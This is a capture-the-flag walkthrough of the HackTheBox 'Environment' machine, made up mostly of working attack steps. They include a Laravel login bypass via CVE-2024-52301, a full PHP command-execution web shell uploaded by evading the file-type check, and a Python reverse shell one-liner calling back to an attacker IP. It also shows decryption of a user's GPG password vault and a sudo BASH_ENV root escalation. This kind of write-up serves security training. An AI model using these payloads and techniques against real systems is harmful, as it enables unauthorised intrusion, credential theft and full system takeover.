# Environment - HTB
Difficulty: Medium

## Enum
Port 22,80
Port 80 running with debug mode on so error dms are seen

```
                        [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 280ms]
login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 236ms]
storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 38ms]
upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 505ms]
up                      [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 138ms]
logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 550ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 41ms]
build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 39ms]
mailing                 [Status: 405, Size: 244871, Words: 46159, Lines: 2576, Duration: 1399ms]
```


So in /login, when you fuck around with the remember param, it erros out and reveals the src. So use that to find this [exploit](https://github.com/Nyamort/CVE-2024-52301) for laravel.

So just modify this in the request

```
POST /login?--env=preprod HTTP/1.1

```

This will bypass login.

Now to upload a shell I sent a request to the upload endpoint by creating a file `shell.php.` and setting the content-type to image/jpg. I also edited the shell.php to this
```php
GIF89a
<html>
    <body>
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
            <input type="SUBMIT" value="Execute">
        </form>
    <pre>
        <?php
            if(isset($_GET['cmd']))
                {
                    system($_GET['cmd'] . ' 2>&1');
                }
        ?>
    </pre>
    </body>
</html>
```

I got this webshell from [here](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985).
Now the GIF89a must be the first couple of bytes so that it bypasses the magic number check. Send this with filename as `shell.php.` and content type as image/jpg. U shud be able to get a shell.

I used this payload to gain a full reverse shell:
```bash
export RHOST="10.10.14.55";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Change the IP obviously.

Just navigate to the home user and get user.txt


Now to gain a shell on user do this
```
cp -r /home/hish/.gnupg /tmp/mygnupg

chmod -R 700 /tmp/mygnupg

gpg --homedir /tmp/mygnupg --list-secret-keys

gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
```

This will output these in /tmp/message.txt
```
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

On running `sudo -l` you get this:
```bash
Matching Defaults entries for root on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User root may run the following commands on environment:
    (ALL : ALL) ALL
```

So you can change the env variables, here ENV and BASH_ENV

So let's first create a file as payload called privesc.sh

```bash
#!/bin/bash
bash -p
```

Now from here, do `chmod +x privesc.sh`

Now do this:
```bash
sudo BASH_ENV=./privesc.sh /usr/bin/systeminfo
```

This gives a root shell
